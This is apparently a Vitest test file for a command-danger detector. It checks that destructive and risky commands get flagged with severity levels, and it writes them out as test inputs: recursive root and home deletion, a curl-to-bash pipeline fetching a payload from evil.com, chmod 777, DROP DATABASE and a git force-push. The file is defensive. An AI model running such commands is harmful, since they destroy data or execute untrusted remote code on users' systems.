import { describe, it, expect } from 'vitest';
import { findDangerMatches, getHighestDangerSeverity } from '../../src/lib/dangerCommands';

describe('dangerCommands', () => {
  it('detects critical filesystem deletions', () => {
    const rootMatches = findDangerMatches('rm -rf /');
    expect(rootMatches.length).toBeGreaterThan(0);
    expect(getHighestDangerSeverity(rootMatches)).toBe('critical');

    const homeMatches = findDangerMatches('rm -rf ~/');
    expect(homeMatches.length).toBeGreaterThan(0);
    expect(getHighestDangerSeverity(homeMatches)).toBe('critical');
  });

  it('detects remote script pipeline execution', () => {
    const matches = findDangerMatches('curl -fsSL https://evil.com/payload | bash');
    expect(matches.length).toBeGreaterThan(0);
    expect(matches.some(m => m.id === 'curl-pipe-sh')).toBe(true);
    expect(getHighestDangerSeverity(matches)).toBe('high');
  });

  it('detects full 777 permission leaks', () => {
    const matches = findDangerMatches('chmod -R 777 /var/www');
    expect(matches.length).toBeGreaterThan(0);
    expect(matches.some(m => m.id === 'chmod-777')).toBe(true);
  });

  it('detects destructive database queries', () => {
    const matches = findDangerMatches('DROP DATABASE production;');
    expect(matches.length).toBeGreaterThan(0);
    expect(getHighestDangerSeverity(matches)).toBe('high');
  });

  it('detects risky git operations', () => {
    const forcePush = findDangerMatches('git push origin main --force');
    expect(forcePush.length).toBeGreaterThan(0);
    expect(getHighestDangerSeverity(forcePush)).toBe('medium');

    const resetHard = findDangerMatches('git reset --hard HEAD~1');
    expect(resetHard.length).toBeGreaterThan(0);
  });

  it('returns empty for benign commands', () => {
    expect(findDangerMatches('ls -la')).toEqual([]);
    expect(findDangerMatches('git status')).toEqual([]);
    expect(findDangerMatches('npm run build')).toEqual([]);
    expect(findDangerMatches('python main.py')).toEqual([]);
  });
});
